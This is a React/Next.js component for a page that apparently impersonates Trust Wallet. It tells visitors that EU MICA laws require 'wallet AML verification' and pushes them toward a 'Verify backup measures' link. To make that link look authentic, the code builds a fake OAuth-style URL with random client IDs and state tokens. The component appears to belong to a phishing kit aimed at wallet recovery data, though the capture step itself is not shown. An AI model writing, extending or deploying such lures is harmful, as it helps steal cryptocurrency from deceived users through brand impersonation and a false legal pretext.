'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'
import TrustLogo from './trustLogo'

function generateRandomString(length: number) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return result
}

export default function VerificationRequest() {
  const [dynamicUrl, setDynamicUrl] = useState('')

  useEffect(() => {
    const clientId = generateRandomString(32)
    const redirectUri = encodeURIComponent("https://account.trustwallet.com/oauth-connect")
    const state = `v2.local.${generateRandomString(16)}.${generateRandomString(48)}`
    const options = encodeURIComponent("login account.trustwallet.com")

    const url = `/verify?url=/api/1/login/oauth/provider/pending` +
      `&client_id=${clientId}` +
      `&redirect_uri=${redirectUri}` +
      `&state=${state}` +
      `&options=${options}`

    setDynamicUrl(url)
  }, [])

  return (
    <div className="mt-24 flex flex-col items-center justify-center">
      <TrustLogo />
      <div className="mt-14 max-w-lg rounded-lg border border-[#575757] px-8 py-4 text-center text-white">
        <h2 className="text-2xl font-semibold">You have been requested to authorize wallet AML verification</h2>
        <h5 className="mt-6 leading-7 text-[#8C8C8C]">European Union MICA laws need us to verify the security of your wallet and perform anti-money laundering checks</h5>
        <div className="mt-4 h-0.5 w-full bg-white opacity-40"></div>
        <Link href={dynamicUrl} className="mt-8 flex items-center justify-center space-x-8">
          <span className="material-symbols-outlined">add_circle</span>
          <div className="flex flex-col items-center justify-center text-center">
            <h3>Verify backup measures</h3>
            <h5 className="text-left text-sm text-[#8C8C8C]">Ensure you are able to recover in an unfortunate scenario</h5>
          </div>
          <span className="material-symbols-outlined">chevron_right</span>
        </Link>
      </div>
    </div>
  )
}

